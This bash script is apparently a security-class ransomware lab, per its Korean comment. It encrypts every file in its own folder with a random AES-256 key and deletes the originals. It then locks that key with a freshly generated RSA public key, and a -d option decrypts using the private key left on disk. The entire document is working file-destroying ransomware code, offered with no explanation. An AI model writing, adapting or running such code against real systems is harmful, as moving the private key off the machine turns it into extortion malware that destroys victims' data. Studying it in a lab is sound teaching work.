#!/bin/bash

# 빅데이터보안 Ransomware 실습


private_key_file="private_key.pem"
public_key_file="public_key.pem"
aes_key_file="aes_key.txt"

script_name=$(basename "$0")
folder_path=$(dirname "$(readlink -f "$0")")

encrypt(){
    aes_key=$(openssl rand -hex 32)
    for file in "$folder_path"/*; do
        if [ -f "$file" ] && [ "$file" != "$folder_path/$script_name" ]; then
            openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k "$aes_key"
            rm "$file"
            echo "Encrypted: $file"
        fi
    done
    openssl genrsa -out private_key.pem
    openssl rsa -pubout -in private_key.pem -out public_key.pem
    echo -n "$aes_key" > "$aes_key_file"
    openssl rsautl -encrypt -inkey "$public_key_file" -pubin -in "$aes_key_file" -out "$aes_key_file.enc"
    rm "$public_key_file" "$aes_key_file"
    echo "Encryption complete."
}

decrypt(){
    openssl rsautl -decrypt -inkey "$private_key_file" -in "$aes_key_file.enc" -out "$aes_key_file"
    aes_key=$(cat "$aes_key_file")
    rm "$private_key_file" "$aes_key_file.enc" "$aes_key_file"
    for file in "$folder_path"/*.enc; do
        if [ -f "$file" ]; then
            openssl enc -d -aes-256-cbc -in "$file" -out "$(basename "$file" | sed 's/\.enc$//')" -k "$aes_key"
            rm "$file"
            echo "Decrypted: $file"
        fi
    done
    echo "Decryption complete."
}


while getopts ":ed" opt; do
    case $opt in
        e)
            encrypt
            ;;
        d)
            decrypt
            ;;
        \?)
            echo "Invalid option: -$OPTARG" >&2
            exit 1
            ;;
    esac
done